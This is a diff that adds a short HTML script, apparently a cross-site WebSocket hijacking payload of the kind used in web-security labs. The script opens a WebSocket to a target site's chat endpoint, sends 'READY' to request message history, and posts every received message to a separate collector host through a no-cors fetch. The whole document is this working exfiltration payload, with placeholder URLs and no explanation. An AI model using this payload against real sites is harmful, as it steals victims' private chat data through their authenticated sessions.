@@ -1,0 +1,9 @@
+<script>
+    var ws = new WebSocket('wss:URL/chat');
+    ws.onopen = function(){
+    	ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://my-proxy-URL', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
